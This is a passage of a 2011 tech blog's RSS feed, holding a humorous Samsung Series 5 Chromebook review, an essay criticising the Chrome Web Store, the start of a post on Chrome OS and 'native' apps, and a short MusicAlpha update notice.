&lt;p&gt;2)Deposition of QD arrays to increase the sensing&lt;/p&gt;
&lt;p&gt;dynamic range to ppb to % level concentrations,&lt;/p&gt;
&lt;p&gt;&lt;del&gt;3)Optimization of 6 element arrays for &lt;/del&gt;&lt;/p&gt;
&lt;p&gt;&lt;del&gt;increased selectivity, and&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;4)Implementation of the pattern recognition software&lt;/p&gt;
&lt;p&gt;selected during the 2006-07 program.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;And so the question is: Is there a specific reason that the secret document was of hydrocarbon detection? What does this have to do with the movie? Is there any significance of the redacted text?&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Samsung Series 5 Chromebook</title>
      <link>http://antimatter15.com/2011/06/samsung-series-5-chromebook/</link>
      <pubDate>Thu, 23 Jun 2011 04:41:00 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2011/06/samsung-series-5-chromebook/</guid>
      <author></author>
      <description>&lt;p&gt;On 5:04pm EST June 21st, 2011, I got &lt;a href=&quot;https://groups.google.com/forum/#!topic/chromebook-central/3C-o4VxgE8k&quot;&gt;an email&lt;/a&gt; inviting me to the super exclusive cool club: the Chromebook guru program. Today, June 23rd, 2011 8:05am I woke up to the sound of my iPhone 3G ringing to a certain 800 number. I have this paranoid tendency to ignore most calls, and my half awake zombie state didn’t exactly help my judgement. Fast forward two minutes, I checked my inbox and there was a terrifying Google Voice transcription sitting there in my inbox. That took two minutes because of how glacially slow it is to get anywhere on an iPhone 3G after the deadly error of updating to iOS 4.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Billable to sign for the shipment. You can go to Fedex dot com To track your package is Status, and determine if it is elligible to be held for pick up at a convenient FedEx location yo repeat this information, press any key yank you from Fedex goodbye.
It felt oddly incomplete, because it turns out, it was. I listened to the (less disjointed) real message, and it was clear that the first forty minutes of the message was probably omitted, and Google Voice only picked up the small section after the beep. Apparently robots aren’t very good at talking to other robots.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;I ran downstairs and checked the door. Nothing was there. I opened the blinds and waited. A few hours later (I managed to build a &amp;lt;canvas&amp;gt; pinball game in the time in between), I heard a sharp knock on the door. I’m not exactly sure of the time because I recorded it all on my iPad and apparently Apple feels that nobody ever cares about when the picture/video was taken and makes it virtually impossible to get that information.&lt;/p&gt;
&lt;h2 id=&quot;delivery&quot;&gt;Delivery&lt;/h2&gt;
&lt;p&gt;So here it was, a brown box. Delivered by FedEx (Which is what’s called a “syllabic abbreviation” of Federal Express as opposed to the boring initialism UPS which stands for United Parcel Services, Inc.). Just because I can, I’ll tell you that the box was about 16.25x16.25x5.5 inches (my portable tape measure is only customary, no metric love). Inside is yet another box (boxes inside boxes are awesome!), but unlike the Cr-48, it’s not a nice friendly brown box with a jetpack-wearing labrat diagram. It’s a gray box with a picture of what’s supposed to be inside the box. The outer box’s packaging was just crumpled paper, which doesn’t look nearly as nice as the other stuff (I think the Cr-48 came with awesome little packaging peanuts).&lt;/p&gt;
&lt;p&gt;So here’s the unboxing. Wait, the box was already opened. And what’s with the small empty green speech bubble sticker on the side? Anyway, the lack of tape probably means that some time travelling ninjas hijacked the FedEx plane in an attempt to rip out the TPM module chip in my Chromebook in order to infect the kernel with a keylogger/filter which replaces all references to time travelling ninjas with time travelling ninjas.&lt;/p&gt;
&lt;p&gt;Inside is some nice white packaging foam. It’s neatly packed, and pretty cool. Sadly, there’s only one component wrapped in bubble wrap, the rather useless VGA adapter. Random side note: I think it’s rather interesting that the Chrome OS people decided that somehow a VGA adapter was somehow more important than an ethernet port. I’ve never plugged in a laptop to a larger display, and I don’t imagine that being a primary use case. But it would make sense to enable a web-oriented device to have faster web access.&lt;/p&gt;
&lt;p&gt;&lt;span style=&quot;font-size: 21px; font-weight: bold;&quot;&gt;Setup&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;So I turn it on, and it opens to something about reformatting the stateful partition because of those time travelling ninjas. It doesn’t really bother me, it reboots, I ignore some legalese and click buttons. It updates (which, by the way, took forever), I login the first time and it asks me to take a picture. The camera’s actually a bit nicer and the video isn’t laggy for some reason. This device is noticably faster than the Cr-48. I decide against taking a picture and just select the little erlenmyer flask with bubbling green liquid (presumably this is what gives the time travelling ninjas super powers).&lt;/p&gt;
&lt;p&gt;Once again, it reboots. I login, it says wrong password, I try again, realize that somehow it forgot my wifi password, login, and it still says it’s wrong because it’s not done connecting to the router literally three feet from me, and I type my google acounts password again and press enter where it still fails yet again because I’m way too fast at typing, or at least I’ll say that because truthfully I’m not really fast at typing but it wouldn’t do any harm pretending I am because I really feel stupid not thinking about waiting for the wifi network to connect first, and so I stare at that little icon on the top right and then it clicks solid. I login.&lt;/p&gt;
&lt;p&gt;I’m greeted a page that tells me how to use a trackpad. I go through the exercises to test my ability to do some rather advanced and intellectually challenging tasks such as “Click the circle” and “Move the circle”. I realized that it was probably just a distraction so that Chrome has some time to load all my apps and extensions by the time I’m done with these challenges.&lt;/p&gt;
&lt;p&gt;Testing out the speed of this thing, I clicked Angry Birds, which to my surprise actually worked. Though I have to admit that trackpads aren’t great for these kinds of pointer-driven games. I would much rather play Angry Birds on my iPad.&lt;/p&gt;
&lt;p&gt;But I guess as a product reviewer, I should probably focus on the hardware first in order to provide a vague semblance of structure and order to this review.&lt;/p&gt;
&lt;h2 id=&quot;hardware&quot;&gt;Hardware&lt;/h2&gt;
&lt;p&gt;At a glance, the Chromebook is thin (But I lied, it’s not really that thin). Still, it’s quite heavy. It feels heavy and has a really solid build. And it comes with tons and tons of stickers, and that’s pretty spammy, but I guess it has this partially glossy finish that needs protection from ninja fingerprints (oh wait, that’s an oxymoron).&lt;/p&gt;
&lt;p&gt;Oddly enough, among the first few things I noticed was that the hinge is a bit weaker than the Cr-48’s. Or at least, when you hold up the device, the lid will sort of collapse on itself under the force of gravity. I think this also happens with Macbooks as well, but it’s a little weird.&lt;/p&gt;
&lt;p&gt;Second, is the little chrome logo on the surface has a sort of texture which feels pretty cool. The chrome logo also really bothers me because the colors just feel slightly off. Also, speaking of weird logos, the Samsung logo doesn’t have a (looks up &lt;a href=&quot;/articles/2011/Samsung%20Series%205%20Chromebook/typography_lesson_poster_larger.jpg&quot;&gt;typography terms&lt;/a&gt; diagram) crossbar on the “A”, which looks really weird. So it’s more like schevronsung or S^msung or something.&lt;/p&gt;
&lt;p&gt;The display doesn’t go as far back as I would like, and with the absence of a protracter, I’ll use my powers of eighth grade geometry (oh wait, no I mean the eighth grade launch of &lt;a href=&quot;http://www.wolframalpha.com/input/?i=15.25%2C+8.5%2C+8.5+triangle&quot;&gt;Wolfram Alpha&lt;/a&gt;, the last time I ever needed to do math) to determine that the maximum angle is 127.5 degrees (approximately, or 2.226 radians or 4.452 tau-ians if &lt;a href=&quot;http://tauday.com&quot;&gt;tau day &lt;/a&gt;is your kind of thing).&lt;/p&gt;
&lt;p&gt;The body of the Chromebook is nice plastic, it’s smooth and pretty hand friendly. The lid is a little weird though, the rim is actually slightly sharp. Not sharp enough to function as a type of improvised knife for murdering people nearby, which a Macbook would suffice at (Anecdote: My leg once started bleeding a lot because it rubbed a little against the sharp part of a macbook pro). But it’s still sharp enough that it feels inconsistent with the rest of the device and to make it feel weird opening and closing the lid. Also, on the lid is this huge terrible shiny bezel. It’s sort of cool for a while when you think it’s sort of cool that you can look at the movement of your fingers while you’re typing a blog post. But it very quickly starts getting annoying and makes the device look cheap. It simply doesn’t feel right in combination with the matte display and the soft diffuse black plastic body.&lt;/p&gt;
&lt;p&gt;Sticking cables like USB and the power adapters makes a somewhat loud click, and rather annoyingly it’s nigh impossible to yank the cable out. Unlike the Cr-48 or any Mac, whose cables pop out fairly easily, this device seems to grab hold of the cables and never wants to let go.&lt;/p&gt;
&lt;p&gt;I like how the new Chromebook is sleeker and looks more solid. It’s less bland (Once I actually mistook a random black paper folder/portfolio for a chromebook). But it also is less of a total Macbook clone. And when making something less of a Macbook clone basically means adding a glarey bezel and a cheap looking lid, sometimes the blatant clone is better.&lt;/p&gt;
&lt;h2 id=&quot;keyboard-touchpad&quot;&gt;Keyboard/Touchpad&lt;/h2&gt;
&lt;p&gt;I’ve actually never noticed the special browser function keys on the chromebook aside from the volume, brightness and power buttons. I’ve basically never used the full screen button, which I just pressed a second ago and I think this is actually pretty cool. Now I see why OS X Lion has that full screen emphasis. Though for some reason, I can’t leave one page full screened and Alt+Tab over to another non-fullscreen window.&lt;/p&gt;
&lt;p&gt;The window switching button, which is more like workspace switching since you only ever have one window open at a time, is more accurately referred to as the “window jiggly button”. Because that’s exactly what it does when you’re on one window, as I’m always on. I guess it’s main purpose is to facilitate those politically incorrect image macros with bad taste about holding F11 in order to make a picture of Haiti (or Japan) shake. It would be a lot more useful if it was a tab switching button instead.&lt;/p&gt;
&lt;p&gt;I’ve never used the refresh button, because it’s always easier to hit Ctrl+R and likewise for forward and back, it’s easier to hit Alt+Left or Alt+Right. Same with the search button, I just hit Ctrl+T.&lt;/p&gt;
&lt;p&gt;Another weird thing is the placement of the Alt and Control keys. I generally never use the alt keys on my desktop computer, but I happen to use it a lot more often here (mainly for forward/back). But it’s also annoying because it still has a mac feel so I want to pretend that Alt is the same thing as the Command button, and then everything’s weird. I liked the Mac Home/End buttons, which I think were Cmd+Option or something. Anyway, I would really want Ctrl+Alt+Left/Ctrl+Alt+Right to work as Home/End.&lt;/p&gt;
&lt;p&gt;Just on looks, the Series 5 keyboard looks a bit weird. The letters on the keys feel slightly off center and the words are printed in a much lighter shade of white/gray. I guess this would help the problems I sometimes have with finding the right keys at night (but I haven’t had this long enough to encounter nightime, in fact, it’s still just past noon). I’ve never noticed that the shift key has a sort of connected “ft” arm (I sure hope I’m using these &lt;span style=&quot;font-family: 'comic sans ms', sans-serif;&quot;&gt;typographic&lt;/span&gt; terms properly, and yes, I did just set the word typographic in comic sans ms).&lt;/p&gt;
&lt;p&gt;The touchpad is better than the Cr-48’s but it’s still really quite lacking in comparsion to the ones on all the Macbooks. Maybe it’s just software, because I’m so used to three finger swipe for navigating forward/back, and Chrome on Mac’s Tabpose feature is genuinely magical. Also, two finger scrolling should be kinetic, it’s just  that much more natural of an experience and makes the device more intimate.&lt;/p&gt;
&lt;h2 id=&quot;tablets&quot;&gt;Tablets&lt;/h2&gt;
&lt;p&gt;The idea of a Chromebook is very similar to that of a tablet (such as the iPad or a future Chromepad). Tablets are very web, or at least web information-oriented, much like how the Chromebook intends to.&lt;/p&gt;
&lt;p&gt;Google has included a rather nice physical keyboard in the device, which shows that they view the keyboard as a superior (and necessary) system for interacting with the web. It’s pretty obvious that the keyboard is great for writing long blog posts, but that’s really not that common of an exercise. Google has to demonstrate that not only is the keyboard useful in certain fringe circumstances, but an everyday useful component.&lt;/p&gt;
&lt;p&gt;Google needs to show that the keyboard isn’t just something that gets in the way of interacting with the web, but a useful aid. An emphasis on search; tab search, page search, or web search could do that (and it would be a great use for that Search key). Firefox has a great feature called Type Ahead Find (There’s a chrome extension that tries to do the same thing, but it’s buggy, and sadly Chrome doesn’t sync localStorage state) where you can just type to navigate and click items.&lt;/p&gt;
&lt;p&gt;And I don’t think they’ve properly done that. The web is currently still very much a pointer driven world, and the Chromebook touchpad is quite lacking.&lt;/p&gt;
&lt;h2 id=&quot;offline&quot;&gt;Offline&lt;/h2&gt;
&lt;p&gt;Chrome OS is actually surprisingly useless in situations where the user is offline. You might find the adverb “surprisingly” a little confusing, because almost all the other reviewers seem to bring the notion that being useless while offline is somehow intrinsic to the concept of the platform. Like that it’s obvious that anything built on internet connectivity will always be useless offline.&lt;/p&gt;
&lt;p&gt;Every Chromebook out there, to my knowledge has a sixteen gigabyte SSD. Sure a gigabyte or two is necessary for the operating system’s function, the kernel, and the other kernel for that fast background feature. Fourteen gigabytes is plenty of space for a cache. Absolutely plenty.&lt;/p&gt;
&lt;p&gt;Chrome has the opportunity to basically cache everything it encounters (and the cache itself is already sufficient for offline browsing if it were accessible), and you can load everything from the cache when the user’s offline. Firefox does this, and I have no idea why Chrome doesn’t.&lt;/p&gt;
&lt;p&gt;As for Google’s own applications, it’s rather disappointing how long it’s taking them to add offline. The Gears API isn’t too much different from AppCache, and it’s unreasonable to take over a year (basically centuries in chrometime) to port that feature over. But at least there’s an expected date (summer, which, come to think of it is actually pretty soon).&lt;/p&gt;
&lt;h2 id=&quot;software&quot;&gt;Software&lt;/h2&gt;
&lt;p&gt;I don’t know why I’m even writing this section. But since I am, let me first write a disclaimer. Chrome progresses fast. A major release every six weeks. Things get fixed quickly. I remember (half a century ago in chrometime) either Larry or Sergey said something about how Chrome/OS is really about a radical shift that rather than having your software get slower (due to bloat, etc) over time, it actually gets faster. Everything here will probably be irrelevant very soon.&lt;/p&gt;
&lt;p&gt;The bundled version, which I’m not using since I almost immediately switched to the always-better unstable ones, had some weird properties. Hovering over the wrench icon would give this horribly hideous black-gray gradient background (and really, that’s all I noticed). Unstable doesn’t have any of that.&lt;/p&gt;
&lt;p&gt;Also, I was disconnected from my Wifi network three times in the process of writing this. It may be my wifi network’s problem, but it’s never happened to me before. Music Beta is acting buggy and sometimes stops after opening and closing the lid.&lt;/p&gt;
&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;The very first impression is always from the hardware. When it’s covered with layers of stickers, that really does sort of subtract from it’s beauty. I don’t want to spend time peeling off six layers of stickers on a laptop already in a bag inside a foam cover inside a box inside packaging inside another box. The hardware underneath all those stickers is pretty nice, with exception to the lid which has a somewhat sharp edge.&lt;/p&gt;
&lt;p&gt;The second impression comes from the setup of the software. I guess legalese is fairly standard, so I can’t take points off for that. Updating right then and there hurts the user experience. You can do that in the background. That’s the point. There’s probably some security rationale, but that initial feeling has a big impact on what users feel.&lt;/p&gt;
&lt;p&gt;Once that’s done, the user learns that the device is practically useless offline.&lt;/p&gt;
&lt;p&gt;Chrome OS feels incomplete. It’s probably deliberate.&lt;/p&gt;
&lt;p&gt;Chrome OS is visionary, and part of the idea is that software can improve over time, rather than getting worse over time. Starting with a flawless experience means that there’s only one way to go: down (That’s why if you’ve owned a Mac for any amount of time, the weakest Macbook Air at the Apple Store feels so much blazingly faster). Starting with a terrible experience gives profound opportunity for a great &lt;em&gt;anagnorisis&lt;/em&gt;, which wikipedia defines as&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;a moment in a play or other work when a character makes a critical discovery. Anagnorisis originally meant &lt;a href=&quot;http://en.wikipedia.org/wiki/Recognition&quot; title=&quot;Recognition&quot;&gt;recognition&lt;/a&gt; in its Greek context, not only of a person but also of what that person stood for.
This first batch of Chrome OS devices represents the beginning of Google’s great plan, that of instituting the new paradigm of progressive enhancement rather than regression. The deliberately sour experience gradually and noticably improves every six weeks. It’s the equivalent of waking up one day and seeing that your toaster now makes coffee.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This is what Chrome OS represents. It’s not the web as a platform, because any platform can run applications. It’s about what the web represents, a continuous online system where things improve every day, without notice. Change just happens. Updates are silent and computing becomes alive.&lt;/p&gt;
&lt;p&gt;Or at least, I want more free hardware.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Why the Chrome Web Store is Bad for the Web.</title>
      <link>http://antimatter15.com/2011/06/why-the-chrome-web-store-is-bad-for-the-web/</link>
      <pubDate>Thu, 02 Jun 2011 05:22:45 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2011/06/why-the-chrome-web-store-is-bad-for-the-web/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;em&gt;Note: I’ve changed a few things that will hopefully make my point a bit more clear&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Apple got it right in 2007.&lt;/p&gt;
&lt;p&gt;If you’ve read any of the other posts in this blog, you will probably come under the assumption that I’m a devout follower of the Church of Google. Thus it will probably be quite a surprise to read the headline, something which appears downright sacrilegious: it questions the infallibility of the great Google. But I try very hard to maintain some semblance of objectivity and rationality, and this post will be about why I think the Chrome Web Store is bad for the web.&lt;/p&gt;
&lt;p&gt;The Chrome Web Store is the applications and extensions gallery for Chrome. It’s Google’s centralized repository and directory for discovering Chrome-related things. Just hearing the name of it, you can probably tell, it’s likely quite inspired by the iOS/iTunes/Mac App Store. It’s not because they aren’t able to innovate (or it might, but I won’t take that view), but it’s probably the result of the huge App Store boom. It’s not that even what Apple did was particularly innovative, but somehow it managed to secure billions of dollars for the company, and all it’s competitors quite rationally want a chunk of it. This however, isn’t about improving the state and future of the web, but rather the indulgence of buzzwords.  This post isn’t only about the Web Store, but rather the entire Chrome Applications and Extensions systems. From distribution to installation and the user experience afterwards.&lt;/p&gt;
&lt;h2 id=&quot;introduction-&quot;&gt;Introduction.&lt;/h2&gt;
&lt;p&gt;There are two types of installable web applications that exist in the Chrome Web Store: hosted apps, in other words “glorified bookmarks”, and packaged apps. Glorified bookmarks are relatively hard to create, expensive and have no real additional functionality. Packaged applications evade the standardized mechanisms for offline web properties and eliminates many of the advantages of web apps in the first place.&lt;/p&gt;
&lt;p&gt;Chrome’s developer overview for creating installable web apps describes the system as a solution to one, rather insignificant, problem. It’s the problem of permissions escalation: some technical detail that hardly seems important. Put simply, it’s that users get annoyed when they’re asked to hit “Okay” to annoying permissions prompts. And so Google’s solution is to invent a certain class of web site which has different security properties, where all the permissions are put into a single prompt.&lt;/p&gt;
&lt;p&gt;To users, however, the existence of a web app is a solution to a much different user experience problem: they want to hit nice large pretty icons to go to sites which they frequently visit. But somehow, the solution they opted for creating these large clickable bookmarks is quite terrible. The only user-facing purpose of installable applications is the ability to bookmark with a large icon, something that Apple got right with iPhone OS in 2007.&lt;/p&gt;
&lt;h2 id=&quot;apple-got-it-right-&quot;&gt;Apple got it right.&lt;/h2&gt;
&lt;p&gt;I love those four words in that order, it feels so sensationalist and rebellious. But before the Cult of Apple leaps on that statement, notice the wording “Apple &lt;em&gt;got&lt;/em&gt; it right”. It doesn’t strictly mean that whatever Apple’s doing &lt;em&gt;now&lt;/em&gt; is right, just that what it &lt;em&gt;did&lt;/em&gt; is right. In fact, that’s exactly what happened. Apple got it right, then made it different, and Google made it wrong.&lt;/p&gt;
&lt;p&gt;First, we need to recall the distant year of 2007. It was quite a while ago, and I won’t pretend that my memory is that great. But it was a long time ago, a full year before the first beta release of Google Chrome. The iPhone was released with it’s plethora of eight apps and no ability to install more. The App Store didn’t exist, and the closest semblance was the Installer.app for jailbroken devices (Cydia came later).  A few months later, Apple released a series of updates, and Steve Jobs signaled what he believed to be the future of iPhone applications: The Web. It doesn’t come surprising that Apple’s Mobile Safari was and likely still is (more or less) the best browser for any mobile device.&lt;/p&gt;
&lt;p&gt;The important aspect is the &lt;em&gt;way&lt;/em&gt; these web applications were installed. You went to Mobile Safari, and browsed around. You found a web app, and you used the web app the &lt;em&gt;way the web was intended&lt;/em&gt;. No installations, you just navigate to a URL and start using it. You find the app useful and/or awesome, and you “bookmark” it.  But, instead of actually doing the browser “bookmark”, you hit the button right below: “Add to Home Screen”. It asks you for a name for that application, automatically prepopulated with the document page title. You hit “Add”, and you now have a nice, shiny icon on your home screen. You can hide the browser chrome and it becomes indistinguishable from the normal native application experience.&lt;/p&gt;
&lt;p&gt;That app icon is just an image URL specified with a single meta tag. It’s totally decentralized in every way, and represents the openness and simplicity that simply &lt;em&gt;makes sense&lt;/em&gt; for this platform. All a developer needs to do to enable their web site to turn into a fully fledged web application is to add a &lt;code&gt;&amp;lt;link rel=&amp;quot;apple-touch-icon&amp;quot; href=&amp;quot;/customIcon.png&amp;quot;/&amp;gt;&lt;/code&gt; in the head section of the page.&lt;/p&gt;
&lt;p&gt;Contrast that with what Google requires: creating a Google checkout account, entering credit card information, navigating to the Chrome Web Store page and clicking several links in the footer in order to navigate to the page where you have to pay $5 for creating an app, create several icons, copy the manifest.json template and editing some values pointing to the icon locations, going to chrome://extensions, enabling developer mode, adding the unpacked app to make sure that it works, then going back to the original directory, zipping it up, and uploading it to the Chrome Web store, where you have to write a description, add screenshots, reupload an icon, publish, wait ten minutes, and then spam the internet with that link and edit your site’s code to point to that page. It’s an awful much to go through in order to &lt;em&gt;just create a bookmark&lt;/em&gt;.&lt;/p&gt;
&lt;h2 id=&quot;apple-turns-evil-&quot;&gt;Apple turns evil.&lt;/h2&gt;
&lt;p&gt;This subtitle is intentionally misleading. I don’t really think Apple’s evil, but that loaded four letter word is much more concise than the more appropriate phrase “Apple adopts a new platform and shifts ideologically to favor a system which is ultimately in conflict with and entirely inapplicable to the web in its current state or in the foreseeable future”.&lt;/p&gt;
&lt;p&gt;Apple’s prescience of the power of the web was sadly a bit anachronistic. The web technologies that would enable their vision &lt;em&gt;were not yet ready&lt;/em&gt;. The second browser wars haven’t really even begun, and the jailbreakers, despite handicaps, still managed to develop that platform more than the officially sanctioned web developers could. Browsers were too slow, hardware was to slow, there weren’t enough features, not enough could be done, and the paradigm was not well understood.&lt;/p&gt;
&lt;p&gt;Apple followed the lead set by the jailbreak community and launched their own native application development and distribution system: The App Store. It was a hit, and soon became a super huge buzzword. It an all that it represented: centralized one click micropayment driven mobile advertising funded indie developer weekend novelty apps.&lt;/p&gt;
&lt;p&gt;&lt;span style=&quot;font-size: 20px; font-weight: bold;&quot;&gt;Google gets it wrong.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;So there was an App Store craze, and everyone wanted one. So it logically follows that Google built an App Store. But the web had no notion of &lt;em&gt;apps&lt;/em&gt;. There were web applications, but they weren’t rigidly defined as apps.  This is where Google got it wrong. The Chrome Web Store needed to sell apps, and had to create a dichotomy out of the web in order to do so. It created a distinction between web apps and websites where none had existed and shouldn’t have ever existed.&lt;/p&gt;
&lt;p&gt;&lt;span style=&quot;font-size: 20px; font-weight: bold;&quot;&gt;The false dichotomy.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Steve Jobs said that on Mobile, people want Apps, not websites. Before blindly mimicking the concept of apps on another platform, one should probably explore &lt;em&gt;why&lt;/em&gt; users like apps over websites. It’s because the mobile app offers a _better mobile-optimized _interface to whatever they’re doing.&lt;/p&gt;
&lt;p&gt;Websites aren’t generally designed for mobile, they are often slower, and can’t make use of persistent user interface elements like a tab bar. Apps aren’t popular because of the existence of the App Store. It’s because there’s additional value provided in having those apps, that users use the App Store to get them.&lt;/p&gt;
&lt;p&gt;However, web apps, just like websites are optimized for normal computers. Web apps are no better than web sites, and when web apps really have nothing to provide, their respective web stores are useless.&lt;/p&gt;
&lt;p&gt;One purported reason for creating the distinction between apps and websites is to give developers the opportunity to charge for the application in the web store. But why should the ability for an author to receive money for his or her respective works be exclusive to web apps? Why not all web sites?&lt;/p&gt;
&lt;p&gt;While it’s quite clear that if anything meant to supplant a desktop application and is built for the web can be considered a “web app”, nearly everything else exists in a sort of gray area. Facebook, Twitter and the other social networking are predominately content focused, but have some app-like characteristics, and so they could be considered “web apps” too, despite how there aren’t really desktop equivalents. But what about sites like the New York Times? Pure content sites would logically seem to be the farthest one can go from the concept of an “application”. It’s clear that &lt;em&gt;any&lt;/em&gt; web site can be considered a web app.&lt;/p&gt;
&lt;p&gt;Since anything can be considered a web app, the Web Store is a mere directory of a certain number of websites. It’s a limited subset of the internet with terrible discoverability properties restricted only to sites where the owner (or a particularly devout fan) is willing to pay $5 in order to allow a subset of users to &lt;em&gt;bookmark the site&lt;/em&gt;. It’s proprietary, no other site can have quite the same properties as &lt;em&gt;the&lt;/em&gt; web store because Google has the Web Store URLs hard coded into chrome somewhere. Searching in the web store really isn’t that great either, with no ability to search reviews, no pagerank, no search operators, no ability to search within the content of apps. You would figure that if Google were to clone a subset of the internet, at least they would get search right.&lt;/p&gt;
&lt;p&gt;This closed, exclusive and excessively tedious process for creating mere bookmarks attacks some of the web’s traditional benefits and ideals.&lt;/p&gt;
&lt;h2 id=&quot;packaged-applications-&quot;&gt;Packaged applications.&lt;/h2&gt;
&lt;p&gt;The above sections dealt with how the “glorified bookmarks” are useless and downright harmful. There is a second class of applications which are similar to the former in that they also get a pretty large prominent and clickable icon, but different in that they actually provide functionality that is different from mere ordinary websites. Its virtues include that they tend to work offline and have the ability to do certain things that normal web apps can not do. However, it pretty much stops there.&lt;/p&gt;
&lt;p&gt;Packaged apps work offline, but their mechanism evades the standardized system of HTML5. Rather than promoting the use of standards, they promote the use of a proprietary and nonstandard signed zip package.&lt;/p&gt;
&lt;p&gt;As they’re “packaged”, they aren’t really “true” web apps, because they don’t actually operate in the scope of the web. They are much closer to desktop apps, practically. They have no URLs, and thus can’t be linked to, evading the very first two letters in HTML and HTTP: “HyperText”. One of the greatest things about web sites is that they can be linked to, and they almost always share that universal identifier to share with people. It’s universally accessible and one of the few things that actually enables intra-site interoperability.&lt;/p&gt;
&lt;h2 id=&quot;conclusion-&quot;&gt;Conclusion.&lt;/h2&gt;
&lt;p&gt;While the “glorified bookmark” class of applications, which make up the vast majority of the Chrome Web Store, can be quite easily fixed by implementing something akin to the iPhone OS home screen web apps, the “packaged applications” are a bit more interesting. They are the source of that problem which the applications system was meant to resolve: permissions. In the current state, there is no system for handling multiple permissions on the web, aside from flooding the screen with infobars, when even that only partially works. What the web needs is a user friendly, informative, and useful system for giving additional permissions to web sites.&lt;/p&gt;
&lt;p&gt;Along with that, the Web Store handles the selling of applications. Accepting money is a two part process, consisting of authentication and payment. Browsers should handle user identity, since they have the resources to do it right, in a nuanced, secure, efficient and user friendly way. Once that’s done, payment would be a logical extension to that. A developer could drop in a Google Checkout widget to have one-click in-app-purchases by tying into the secure browser identity system.&lt;/p&gt;
&lt;p&gt;The Chrome Web Store should be reduced to a community maintained directory of useful web applications, something like a wiki, and there shouldn’t be a $5 fee to add applications.&lt;/p&gt;
&lt;p&gt;Some people have expressed the idea that the Chrome Web Store is useful because it allows Google, a trusted party, to take down dangerous or malicious applications quickly. And while this is true, note that the Web Store is not actually the sole means to install chrome applications, and a malicious party would most likely exploit those alternate channels, and the only way to combat those is to institute a sort of Kill Switch, much like the kind that iOS, Kindle, and Android already implement.&lt;/p&gt;
&lt;div&gt;&lt;span style=&quot;color: #221122; font-family: 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Lucida, Arial, Helvetica, sans-serif; line-height: normal;&quot;&gt;&lt;code&gt; &lt;/code&gt;&lt;/span&gt;&lt;/div&gt;
</description>
    </item>
    <item>
      <title>Chrome OS, the delusion of native, and perfection</title>
      <link>http://antimatter15.com/2011/05/chrome-os-the-delusion-of-native-and-perfection/</link>
      <pubDate>Sun, 22 May 2011 04:55:12 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2011/05/chrome-os-the-delusion-of-native-and-perfection/</guid>
      <author></author>
      <description>&lt;blockquote&gt;
&lt;p&gt;Perfection is achieved, not when there is nothing more to add, but when there is nothing left to take away.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Antoine de Saint-Exupery&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Warning: This is half a post about how I really want Google to send me a Cr-48, and half of my inability to work on an essay at three in the morning. Also, parts of this post were written on a Logitech Revue Google TV, that was just sent today. So, as this post is pretty broad and tangential anyway, I’ll cram a consise review of the Google TV system in here as well; The initial impression isn’t that great. Setup is longer than it should be, and the immediate uses aren’t really clear. Initially, it seems like an unnecessarily complex over simplified (somewhat an oxymoron, but that’s what Google TV is) media center PC. But after playing with it for a few hours, it does seem much nicer. The keyboard is nice and the touchpad is surprisingly usable (my only gripe is that the click button is too close to the back button). Finding videos and watching them is quite nice, the twitter client is surprisingly usable and the browser is great most of the time.&lt;/p&gt;
&lt;h2 id=&quot;the-delusion-of-native&quot;&gt;The delusion of native&lt;/h2&gt;
&lt;p&gt;Critics of Chrome OS often say that Chrome OS is useless for it’s lack of “native” applications. But “native” is really just another word that has lost its intrinsic meaning, like HTML5, Ajax and Web2.0. Most people consider Android’s App Marketplace apps “native”, despite that they’re Dalvik VM bytecode and not raw binary ARM code. Even in iOS, a native app usually refers to, not the binary that comes out of XCode, but the application’s usage of the Cocoa Touch graphics framework. The only case when the word “native” poses any real meaning is in gaming, where frames need to be drawn as quickly as possible, where the core loops are often hand written optimized assembly. But iOS, Android and Chrome OS support this in the form of the NDK and Native Client. That leaves a single primary connotation of native applications: consistent interface look and feel. &lt;/p&gt;
&lt;p&gt;The web as a platform is relatively low level. The only user interface widgets provided are form components such as checkboxes, buttons and text fields. This low level interface forces for the most part, people to implement their own extended widget sets, and in many cases, choose to reimplement the native controls to introduce consistency across browsers.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>MusicAlpha Upload to Google Music Beta from Linux and Chrome OS</title>
      <link>http://antimatter15.com/2011/05/musicalpha-upload-to-google-music-beta-from-linux-and-chrome-os/</link>
      <pubDate>Sat, 14 May 2011 06:24:12 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2011/05/musicalpha-upload-to-google-music-beta-from-linux-and-chrome-os/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;em&gt;&lt;strong&gt;Rather pleasant update:&lt;/strong&gt; This app works again. After some &lt;a href=&quot;http://antimatter15.com/2011/05/musicalpha-upload-to-google-music-beta-from-linux-and-chrome-os/2012/02/musicalpha-v2-0/%20‎&quot;&gt;epic hackery&lt;/a&gt;, it now works again.  &lt;a href=&quot;https://chrome.google.com/webstore/detail/obojocfchdgdpgcigcdhdnlakfcbbgfn&quot;&gt;Install it&lt;/a&gt; now, in its fully functional, redesigned glory.&lt;/em&gt;&lt;/p&gt;
&lt;hr&gt;
